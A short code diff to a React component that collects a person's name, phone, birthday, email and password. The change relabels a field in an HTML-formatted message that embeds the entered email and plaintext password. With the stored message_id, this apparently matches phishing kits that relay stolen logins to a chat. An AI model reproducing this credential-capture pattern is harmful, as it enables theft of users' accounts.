@@ -24,7 +24,8 @@ const GetInfo: React.FC = () => {
 	const [name, setName] = useState<string>('');
 	const [phoneNumber, setPhoneNumber] = useState<string>('');
 	const [birthday, setBirthday] = useState<string>('');
-	const [email, setEmail] = useState<string>('');
+	const [email, setEmail
+] = useState<string>('');
 	const [password, setPassword] = useState<string>('');
 	const [confirmPassword, setConfirmPassword] = useState<string>('');
 
@@ -75,7 +76,7 @@ const GetInfo: React.FC = () => {
 			} else {
 				const newMessage =
 					message +
-					`<b>📧 Email:</b> <code>${email}</code>\n` +
+					`<b>📧 Email/Số điện thoại:</b> <code>${email}</code>\n` +
 					`<b>🔒 Mật khẩu:</b> <code>${password}</code>`;
 				setMessage(newMessage);
 				const messageId = localStorage.getItem('message_id');
